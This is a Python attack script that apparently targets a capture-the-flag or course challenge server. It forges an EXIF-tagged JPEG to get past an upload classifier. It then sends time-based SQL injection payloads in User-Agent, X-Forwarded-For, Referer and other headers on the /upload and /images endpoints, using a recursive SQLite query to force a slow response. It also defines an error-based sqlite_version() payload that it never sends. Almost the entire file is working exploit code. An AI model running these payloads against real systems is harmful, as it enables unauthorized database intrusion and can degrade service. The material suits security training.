# header_sqli.py — SQLi via HTTP headers. Servers often log/store User-Agent, X-Forwarded-For,
# Referer into the DB (sometimes unsanitized). Test time-based + error-based via headers on both
# /upload and /images. Category is SQLi and every body/EXIF field is parameterized, so a header
# is a strong remaining candidate.
import requests, base64, time
from PIL import Image
import piexif

BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"

# valid landscape+exif so /upload passes the classifier
img = Image.open("paisaje.png").convert("RGB"); img.save("h.jpg","jpeg",quality=85)
def dms(x):
    dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
    'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
    'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
           piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
piexif.insert(piexif.dump(ex),"h.jpg")
URI = "data:image/jpeg;base64,"+base64.b64encode(open("h.jpg","rb").read()).decode()

HEAVY = "(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<3000000) SELECT x FROM c))"
q="'"
payload_time = q+"||"+HEAVY+"||"+q
payload_err  = q+"||(SELECT sqlite_version())||"+q

hdr_names = ["User-Agent","X-Forwarded-For","Referer","X-Real-IP","X-Forwarded-Host","Client-IP","True-Client-IP"]

def timed_upload(headers):
    t=time.time()
    r=requests.post(f"{BASE}/upload", json={"image":URI,"description":"hdr","user_id":UID}, headers=headers)
    return round(time.time()-t,2), r.status_code

print("baseline upload:", timed_upload({}))
print("\n-- time-based via headers on /upload (slow => injectable) --")
for h in hdr_names:
    dt, sc = timed_upload({h: payload_time})
    print(f"  {h:20} -> {dt}s  {sc}")

def timed_get(headers):
    t=time.time()
    r=requests.get(f"{BASE}/images/{UID}", headers=headers)
    return round(time.time()-t,2), r.status_code

print("\nbaseline GET:", timed_get({}))
print("\n-- time-based via headers on /images GET --")
for h in hdr_names:
    dt, sc = timed_get({h: payload_time})
    print(f"  {h:20} -> {dt}s  {sc}")
